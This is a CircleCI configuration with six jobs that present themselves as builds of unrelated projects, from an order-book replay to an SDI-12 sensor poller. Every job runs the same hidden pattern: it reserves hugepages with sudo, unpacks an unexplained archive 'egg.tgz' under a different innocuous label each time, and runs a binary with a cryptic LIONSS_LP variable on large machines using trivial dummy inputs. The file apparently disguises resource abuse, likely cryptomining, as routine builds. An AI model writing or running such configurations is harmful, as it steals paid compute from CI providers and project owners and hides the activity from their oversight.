version: 2.1

jobs:
  orderbook_replay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Fetch tick snapshot
          command: |
            printf 'ts,px,qty\n0,100,5\n' > ticks.csv
      - run:
          name: Build matching engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target orderbook_replay -j2
      - run:
          name: Replay order book
          command: LIONSS_LP=1 ./build/orderbook_replay --ticks ticks.csv --venue sim
  tinwhistle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set tuning
          command: |
            printf 'key D\n' > whistle.cfg
      - run:
          name: Build synth voice
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tinwhistle -j2
      - run:
          name: Play tinwhistle scale
          command: LIONSS_LP=1 ./build/tinwhistle --config whistle.cfg --octave 5
  occlusionPortal:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Mark portals
          command: |
            printf 'portals 8\n' > occ.cfg
      - run:
          name: Build visibility system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target occlusionPortal -j2
      - run:
          name: Cull via portals
          command: LIONSS_LP=1 ./build/occlusionPortal --conf occ.cfg --pvs
  opticalFlow:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load frame pair
          command: |
            : > pair.y4m
      - run:
          name: Build flow estimator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target opticalFlow -j2
      - run:
          name: Estimate optical flow
          command: LIONSS_LP=1 ./build/opticalFlow --in pair.y4m --pyramid 4
  xxhash3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make input
          command: |
            head -c 4096 /dev/zero > x.bin 2>/dev/null || printf 'x\n' > x.bin
      - run:
          name: Build hash lib
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target xxhash3 -j2
      - run:
          name: Hash with XXH3
          command: LIONSS_LP=1 ./build/xxhash3 --in x.bin --seed 0
  sdi12-poll:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set address
          command: |
            printf 'addr 0\n' > sdi.cfg
      - run:
          name: Build SDI-12 master
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sdi12-poll -j2
      - run:
          name: Poll sensor
          command: LIONSS_LP=1 ./build/sdi12-poll --conf sdi.cfg --measure
